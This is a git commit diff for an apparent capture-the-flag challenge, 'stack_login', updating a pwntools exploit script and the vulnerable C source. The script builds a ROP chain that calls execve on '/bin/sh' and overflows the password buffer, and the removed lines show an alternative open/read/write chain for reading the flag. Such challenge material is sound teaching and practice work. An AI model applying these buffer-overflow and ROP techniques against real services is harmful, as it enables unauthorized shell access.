d426dd2daaefa5cd093a4b1f0b37f1c8a3def764
dbgbgtf1 <88665013@qq.com>
2024-12-04 01:44:37 +0800

    solve the problem, stack_login is ready

--- Pwn/stack_login/src/Pwn.py
+++ Pwn/stack_login/src/Pwn.py
@@ -14,29 +14,20 @@ b Password
 
 # io = process("./pwn")
 # debug(io)
-io = remote("0.0.0.0", 9999)
+io = remote("127.0.0.1", 9999)
 
 syscall = 0x4194BF
-rax = 0x00000000004212eb
-rdi = 0x00000000004787f3
-rsi = 0x0000000000477d7d
-rdx = 0x00000000004018ed
+rax = 0x4212eb
+rdi = 0x4787f3
+rsi = 0x477d7d
+rdx = 0x4018ed
+
 username = 0x4aba58
 flag_adr = username + 0xE0
 sh_adr = username + 0x50
 
 rop = b''
-# open
 rop+= p64(rax) + p64(0x3B) + p64(rdi) + p64(sh_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)
-flag_adr = username + 0xE0
-
-# rop = b''
-# # open
-# rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(flag_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)
-# # read
-# rop+= p64(rax) + p64(0x0) + p64(rdi) + p64(3) + p64(rsi) + p64(username) + p64(rdx) + p64(0x100) + p64(syscall)
-# # write
-# rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(username) + p64(rdx) + p64(0x70) + p64(syscall)
 
 io.sendafter(b'username\n', rop + b'/bin/sh\x0a')
 io.sendafter(b'password\n', b'a'*0xe8 + b'\xff')
--- Pwn/stack_login/src/stack_login.c
+++ Pwn/stack_login/src/stack_login.c
@@ -50,5 +50,4 @@ int main()
     myread(username, namesize);
 
     Password();
-    puts("exit!");
 }
